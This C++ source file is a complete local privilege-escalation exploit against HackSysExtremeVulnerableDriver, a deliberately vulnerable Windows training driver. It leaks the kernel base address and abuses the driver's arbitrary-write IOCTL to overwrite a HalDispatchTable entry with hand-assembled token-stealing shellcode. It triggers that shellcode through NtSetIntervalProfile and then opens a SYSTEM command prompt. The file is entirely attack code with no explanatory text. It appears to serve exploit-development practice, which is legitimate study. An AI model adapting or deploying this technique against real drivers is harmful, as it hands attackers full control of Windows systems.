
```cpp
// /HalSetSystemInformation

#include <iostream>
#include <string.h>
#include <Windows.h>

using namespace std;

#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
#define HEVD_IOCTL_ARBITRARY_WRITE IOCTL(0x802)

typedef struct SYSTEM_MODULE {
    ULONG Reserved1;
    ULONG Reserved2;
    PVOID ImageBaseAddress;
    ULONG ImageSize;
    ULONG Flags;
    WORD Id;
    WORD Rank;
    WORD LoadCount;
    WORD NameOffset;
    CHAR Name[256];
} SYSTEM_MODULE, *PSYSTEM_MODULE;

typedef struct SYSTEM_MODULE_INFORMATION {
    ULONG ModulesCount;
    SYSTEM_MODULE Modules[1];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemModuleInformation = 0xB
} SYSTEM_INFORMATION_CLASS;

typedef struct _WRITE_WHAT_WHERE {
    PULONG_PTR What;
    PULONG_PTR Where;
} WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE;

typedef enum _KPROFILE_SOURCE {
    ProfileTime,
    ProfileAlignmentFixup,
    ProfileTotalIssues,
    ProfilePipelineDry,
    ProfileLoadInstructions,
    ProfilePipelineFrozen,
    ProfileBranchInstructions,
    ProfileTotalNonissues,
    ProfileDcacheMisses,
    ProfileIcacheMisses,
    ProfileCacheMisses,
    ProfileBranchMispredictions,
    ProfileStoreInstructions,
    ProfileFpInstructions,
    ProfileIntegerInstructions,
    Profile2Issue,
    Profile3Issue,
    Profile4Issue,
    ProfileSpecialInstructions,
    ProfileTotalCycles,
    ProfileIcacheIssues,
    ProfileDcacheAccesses,
    ProfileMemoryBarrierCycles,
    ProfileLoadLinkedIssues,
    ProfileMaximum
} KPROFILE_SOURCE, *PKPROFILE_SOURCE;

typedef NTSTATUS(WINAPI* PNtQuerySystemInformation)(
    __in SYSTEM_INFORMATION_CLASS SystemInformationClass,
    __inout PVOID SystemInformation,
    __in ULONG SystemInformationLength,
    __out_opt PULONG ReturnLength
);

typedef NTSTATUS(WINAPI* PNtQueryIntervalProfile)(
    __in KPROFILE_SOURCE ProfileSource,
    __in ULONG* Interval
);

typedef NTSTATUS(WINAPI* PNtSetIntervalProfile)(
    __in ULONG* Interval,
    __in KPROFILE_SOURCE ProfileSource
);

INT32 GetKernelBaseAddress() {
    // Get NtQuerySystemInformation Address
    PNtQuerySystemInformation NtQuerySystemInformation =
        (PNtQuerySystemInformation)GetProcAddress(
            GetModuleHandleA("ntdll.dll"),
            "NtQuerySystemInformation"
        );

    if (!NtQuerySystemInformation) {
        cout << "[!] Failed to Get the Address of NtQuerySystemInformation." << endl;
        cout << "[!] Last Error:" << GetLastError() << endl;
        exit(1);
    }

    ULONG len = 0;

    // Get Buffer Length
    NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &len);

    // Allocate Memory
    PSYSTEM_MODULE_INFORMATION PModuleInfo =
        (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(
            NULL,
            len,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_EXECUTE_READWRITE
        );

    // Get SYSTEM_MODULE_INFORMATION
    NTSTATUS Status =
        NtQuerySystemInformation(
            SystemModuleInformation,
            PModuleInfo,
            len,
            &len
        );

    if (Status != (NTSTATUS)0x0) {
        cout << "[!] NtQuerySystemInformation Failed!" << endl;
        exit(1);
    }

    PVOID KernelImageBase =
        PModuleInfo->Modules[0].ImageBaseAddress;

    cout << "[>] Kernel base address: 0x"
         << hex
         << KernelImageBase
         << endl;

    return (INT32)KernelImageBase;
}

int main() {
    HANDLE hFile = CreateFileA(
        "\\\\.\\HackSysExtremeVulnerableDriver",
        GENERIC_READ | GENERIC_WRITE,
        NULL,
        NULL,
        OPEN_EXISTING,
        NULL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) {
        cout << "[!] No Handle to HackSysExtremeVulnerableDriver" << endl;
        exit(1);
    }

    cout << "[>] Handle to HackSysExtremeVulnerableDriver: 0x"
         << hex
         << (INT32)hFile
         << endl;

    INT32 KrBase = GetKernelBaseAddress();
    INT32 HalDispatchTable_Address = KrBase + 0x0012b3f8;
    INT32 HalQuerySystemInformation_Address = HalDispatchTable_Address + 0x4;
    INT32 HalSetSystemInformation_Address = HalDispatchTable_Address + 0x8;

    // HalQuerySystemInformation_Address Offset 0x912
    CHAR* SC = (CHAR*)VirtualAlloc(0, 0x60, 0x3000, 0x40);
    ZeroMemory(SC, 0x60);

    __asm {
        pushad;
        mov ebx, HalSetSystemInformation_Address;
        mov eax, HalQuerySystemInformation_Address;
        mov edi, SC;
        mov[edi], 0x60;
        mov dword ptr[edi + 0x1], 0x000000E8;
        mov dword ptr[edi + 0x5], 0x588B5800;
        mov dword ptr[edi + 0x9], 0x4F488B4B;
        mov dword ptr[edi + 0xD], 0xC281138B;
        mov dword ptr[edi + 0x11], 0x00000912;
        mov dword ptr[edi + 0x15], 0x90901189;
        mov dword ptr[edi + 0x19], 0x8B64C031;
        mov dword ptr[edi + 0x1D], 0x00012480;
        mov dword ptr[edi + 0x21], 0x50408B00;
        mov dword ptr[edi + 0x25], 0x04BAC189;
        mov dword ptr[edi + 0x29], 0x8B000000;
        mov dword ptr[edi + 0x2D], 0x0000B880;
        mov dword ptr[edi + 0x31], 0x00B82D00;
        mov dword ptr[edi + 0x35], 0x90390000;
        mov dword ptr[edi + 0x39], 0x000000B4;
        mov dword ptr[edi + 0x3D], 0x908BED75;
        mov dword ptr[edi + 0x41], 0x000000F8;
        mov dword ptr[edi + 0x45], 0x00F89189;
        mov dword ptr[edi + 0x49], 0x31610000;
        mov dword ptr[edi + 0x4D], 0x0000C3C0;
        mov dword ptr[edi + 0x51], eax;
        mov dword ptr[edi + 0x55], ebx;
        popad;
    }

    PULONG_PTR* PShellcode = (PULONG_PTR*)&SC;

    PWRITE_WHAT_WHERE Buffer;
    Buffer = (WRITE_WHAT_WHERE*)malloc(sizeof(WRITE_WHAT_WHERE));
    ZeroMemory(Buffer, sizeof(WRITE_WHAT_WHERE));

    Buffer->Where = (PULONG_PTR)HalSetSystemInformation_Address;
    Buffer->What = (PULONG_PTR)PShellcode;

    DWORD size_returned = 0;
    BOOL is_ok = DeviceIoControl(
        hFile,
        HEVD_IOCTL_ARBITRARY_WRITE,
        Buffer,
        sizeof(WRITE_WHAT_WHERE),
        NULL,
        0,
        &size_returned,
        NULL
    );

    PNtSetIntervalProfile NtSetIntervalProfile =
        (PNtSetIntervalProfile)GetProcAddress(
            GetModuleHandleA("ntdll.dll"),
            "NtSetIntervalProfile"
        );

    if (!NtSetIntervalProfile) {
        cout << "[!] Failed to Get the Address of NtSetIntervalProfile." << endl;
        cout << "[!] Last error " << GetLastError() << endl;
        exit(1);
    }

    NtSetIntervalProfile((ULONG*)SC, ProfileTotalIssues);

    PROCESS_INFORMATION ProcessInformation;
    ZeroMemory(&ProcessInformation, sizeof(ProcessInformation));

    STARTUPINFOA StartupInfo;
    ZeroMemory(&StartupInfo, sizeof(StartupInfo));

    CreateProcessA(
        "C:\\Windows\\System32\\cmd.exe",
        NULL,
        NULL,
        NULL,
        0,
        CREATE_NEW_CONSOLE,
        NULL,
        NULL,
        &StartupInfo,
        &ProcessInformation
    );

    VirtualFree(SC, 0, MEM_RELEASE);
}
```
